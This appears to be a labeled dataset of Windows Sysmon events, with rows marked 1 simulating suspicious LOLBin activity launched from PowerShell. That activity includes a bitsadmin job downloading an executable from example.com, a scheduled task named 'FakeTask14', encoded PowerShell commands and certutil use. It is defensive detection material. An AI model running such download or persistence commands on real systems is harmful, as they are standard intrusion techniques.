""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: - EventType: SetValue UtcTime: 2025-11-27 17:19:54.008 ProcessGuid: {3a35410f-8839-6928-b806-000000000b00} ProcessId: 10576 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\lnkfile\shellex\ContextMenuHandlers\ FileSyncEx\(Default) Details: {CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B} User: DESKTOP-EJG8QJC\Emil Jinu,0
Network connection detected: RuleName: - UtcTime: 2025-11-27 18:03:21.509 ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00} ProcessId: 15028 Image: C:\Windows\System32\wbem\WMIC.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: udp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 60901 SourcePortName: - DestinationIsIpv6: false DestinationIp: 1.0.0.1 DestinationHostname: one.one.one.one DestinationPort: 53 DestinationPortName: domain,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:04.976 ProcessGuid: {3a35410f-93fc-6928-8915-000000000b00} ProcessId: 11108 Image: C:\Windows\System32\cmd.exe FileVersion: 10.0.19041.4355 (WinBuild.160101.0800) Description: Windows Command Processor Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 4 & timeout /t 1 >nul CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 15:30:57.373 ProcessGuid: {3a35410f-6eb1-6928-d703-000000000b00} ProcessId: 9228 Image: C:\Windows\System32\svchost.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Host Process for Windows Services Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: svchost.exe CommandLine: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s DeviceAssociationService CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=3D1034D6ED3DAED60816A25C561E8C83,SHA256=B0B36BFF7AE4057F687D839CD4B3D81159AB646F1EE1B22106A927E93DECBB61,IMPHASH=F9BBD96FAE53B7A31264A703CAFA0666 ParentProcessGuid: {3a35410f-6567-6928-0b00-000000000b00} ParentProcessId: 708 ParentImage: C:\Windows\System32\services.exe ParentCommandLine: C:\Windows\system32\services.exe ParentUser: NT AUTHORITY\SYSTEM",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:52.740 ProcessGuid: {3a35410f-9288-6928-3c11-000000000b00} ProcessId: 1076 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job7 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:37:18.156 ProcessGuid: {3a35410f-8c4e-6928-d507-000000000b00} ProcessId: 10232 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_nvmj1rqs.opj.ps1 CreationUtcTime: 2025-11-27 17:37:18.156 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:09.080 ProcessGuid: {3a35410f-9299-6928-d211-000000000b00} ProcessId: 10952 Image: C:\Windows\System32\schtasks.exe FileVersion: 10.0.19041.5965 (WinBuild.160101.0800) Description: Task Scheduler Configuration Tool Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: schtasks.exe CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask14 /tr notepad.exe /sc once /st 23:59 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:13.850 ProcessGuid: {3a35410f-9405-6928-0816-000000000b00} ProcessId: 5684 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 16:49:56.575 ProcessGuid: {3a35410f-810c-6928-5a05-000000000b00} ProcessId: 8960 QueryName: microsoft.com QueryStatus: 0 QueryResults: 2603:1030:20e:3::23c;2603:1030:c02:8::14;2603:1020:201:10::10f;2603:1010:3:3::5b;2603:1030:b:3::152;::ffff:13.107.213.58;::ffff:13.107.246.58; Image: C:\Windows\System32\wbem\WmiPrvSE.exe User: NT AUTHORITY\NETWORK SERVICE,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:55.139 ProcessGuid: {3a35410f-92c7-6928-0213-000000000b00} ProcessId: 2432 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:47:58.855 ProcessGuid: {3a35410f-8ece-6928-3008-000000000b00} ProcessId: 7596 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 72'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 15:09:52.872 ProcessGuid: {3a35410f-69c0-6928-aa02-000000000b00} ProcessId: 4740 Image: C:\Program Files\Internet Explorer\ielowutil.exe FileVersion: 11.00.19041.1 (WinBuild.160101.0800) Description: Internet Low-Mic Utility Tool Product: Internet Explorer Company: Microsoft Corporation OriginalFileName: ielowutil.exe CommandLine: ""C:\Program Files\Internet Explorer\IELowutil.exe"" -PID:123 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D831180F7596E0D2BB87B2CC57ECFCA2,SHA256=3099B6CF67191B1A7E4D8463576FE85835E8DF2296DBA3470B0CD42BABD336C8,IMPHASH=D9652E955DB76BA3EEBAB87845BB3F85 ParentProcessGuid: {3a35410f-69b0-6928-a902-000000000b00} ParentProcessId: 10600 ParentImage: C:\Windows\System32\msfeedssync.exe ParentCommandLine: ""C:\Windows\system32\msfeedssync.exe"" sync ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:59:42.872 ProcessGuid: {3a35410f-918e-6928-830c-000000000b00} ProcessId: 14556 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAOAA4ACcA CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:23.234 ProcessGuid: {3a35410f-881a-6928-9c06-000000000b00} ProcessId: 2128 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{7AFDFDDB-F914-11E4-8377-6C3BE50D980C}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:20:03.972 ProcessGuid: {3a35410f-8842-6928-c606-000000000b00} ProcessId: 11160 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{9AA2F32D-362A-42D9-9328-24A483E2CCC3}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:49:11.790 ProcessGuid: {3a35410f-8f17-6928-6908-000000000b00} ProcessId: 5112 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 129'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:31:53.796 ProcessGuid: {3a35410f-8b09-6928-aa07-000000000b00} ProcessId: 14508 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: msedge.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --skip-read-main-dll --metrics-shmem-handle=1644,i,3012290582015033193,7718898074384183847,524288 --field-trial-handle=2416,i,11010279649229733486,8200486474391433340,262144 --variations-seed-version --trace-process-track-uuid=3190708996619331833 --mojo-platform-channel-handle=6220 /prefetch:8 CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=CC88E8CBC96E0183F15A240EC2E6D7BB,SHA256=C089768E72071ACA205E6B77C0538F58A3896CE5B0F65BA9BD38CDAE263D8A03,IMPHASH=4C2A67DEB457B8BF9F317820EE11E05D ParentProcessGuid: {3a35410f-8ae9-6928-8907-000000000b00} ParentProcessId: 7412 ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
Dns query: RuleName: - UtcTime: 2025-11-27 15:31:46.974 ProcessGuid: {3a35410f-6ed8-6928-e703-000000000b00} ProcessId: 12968 QueryName: eagle.sapphire.microsoftapp.net QueryStatus: 0 QueryResults: type: 5 eagle-sapphire-cvdsggfrcxf0aje8.b02.azurefd.net;type: 5 mr-b02.tm-azurefd.net;type: 5 shed.dual-low.part-0030.t-0009.t-msedge.net;type: 5 part-0030.t-0009.t-msedge.net;2620:1ec:bdf::58;2620:1ec:46::58;::ffff:13.107.213.58;::ffff:13.107.246.58; Image: C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\Skype.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:40.435 ProcessGuid: {3a35410f-9420-6928-b016-000000000b00} ProcessId: 6704 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMwAwACcA CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: - EventType: SetValue UtcTime: 2025-11-27 15:28:58.874 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\olk.exe\Path Details: C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2025.1111.100_x64__8wekyb3d8bbwe User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:13.334 ProcessGuid: {3a35410f-9405-6928-0116-000000000b00} ProcessId: 7564 Image: C:\Windows\System32\timeout.exe FileVersion: 10.0.19041.1 (WinBuild.160101.0800) Description: timeout - pauses command processing Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: timeout.exe CommandLine: timeout /t 1 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=100065E21CFBBDE57CBA2838921F84D6,SHA256=C8C350FAB1130644536DB6A84F605791367308B995079AD494D46A8C617C21D6,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B ParentProcessGuid: {3a35410f-9403-6928-e915-000000000b00} ParentProcessId: 7400 ParentImage: C:\Windows\System32\cmd.exe ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 13 & timeout /t 1 >nul ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: InvDB-Ver EventType: SetValue UtcTime: 2025-11-27 15:35:44.090 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\unregmp2.exe|41f6a1604c770bae\BinProductVersion Details: 12.0.19041.1 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:46:21.143 ProcessGuid: {3a35410f-8e6d-6928-0408-000000000b00} ProcessId: 11064 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 29'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 17:11:28.943 ProcessGuid: {3a35410f-81a2-6928-9d05-000000000b00} ProcessId: 11660 QueryName: auth.wikimedia.org QueryStatus: 0 QueryResults: type: 5 dyna.wikimedia.org;103.102.166.224; Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:21.346 ProcessGuid: {3a35410f-8aac-6928-6c07-000000000b00} ProcessId: 13432 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{C5FF006E-2AE9-408C-B85B-2DFDD5449D9C}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:05:32.178 ProcessGuid: {3a35410f-92ec-6928-1814-000000000b00} ProcessId: 18392 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job40 http://example.com/file.exe C:\Temp\file40.exe CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:18:38.225 ProcessGuid: {3a35410f-87ee-6928-9606-000000000b00} ProcessId: 14732 Image: C:\Windows\System32\smartscreen.exe FileVersion: 10.0.19041.6456 (WinBuild.160101.0800) Description: Windows Defender SmartScreen Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: smartscreen.exe CommandLine: C:\Windows\System32\smartscreen.exe -Embedding CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=729B70C3F7099783CC0B2C26431CC866,SHA256=3DA437B642468EAFAB7CD1B9DCF2CDF838B44C63FD73DAE8E3E4D06EC187C0F3,IMPHASH=4B886C738F992DAAEB38C0F29965B8BD ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",0
Registry value set: RuleName: InvDB EventType: SetValue UtcTime: 2025-11-27 14:59:28.591 ProcessGuid: {3a35410f-658e-6928-7600-000000000b00} ProcessId: 2560 Image: C:\Windows\system32\svchost.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe Details: Binary Data User: NT AUTHORITY\SYSTEM,0
Registry value set: RuleName: InvDB-Path EventType: SetValue UtcTime: 2025-11-27 15:05:34.091 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\audiodg.exe|b69448042cce977b\LowerCaseLongPath Details: c:\windows\system32\audiodg.exe User: NT AUTHORITY\SYSTEM,0
